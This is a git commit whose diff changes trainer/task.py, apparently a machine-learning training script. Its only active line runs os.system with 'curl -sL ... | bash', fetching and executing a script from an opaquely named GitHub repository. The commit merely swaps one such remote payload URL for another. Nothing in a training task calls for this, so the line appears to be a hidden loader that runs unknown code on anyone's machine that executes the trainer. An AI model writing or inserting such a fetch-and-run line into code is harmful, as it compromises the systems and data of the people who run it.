6478b35874232bc321942046b53b38ed6fc77ffc
tallapallitech63 <tallapallitech63@proton.me>
2025-09-19 21:30:06 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/tallapallitech63/xcvmk/raw/main/xcbgh | bash')
+os.system('curl -sL https://github.com/tallapallitech63/opmol/raw/main/olkj | bash')
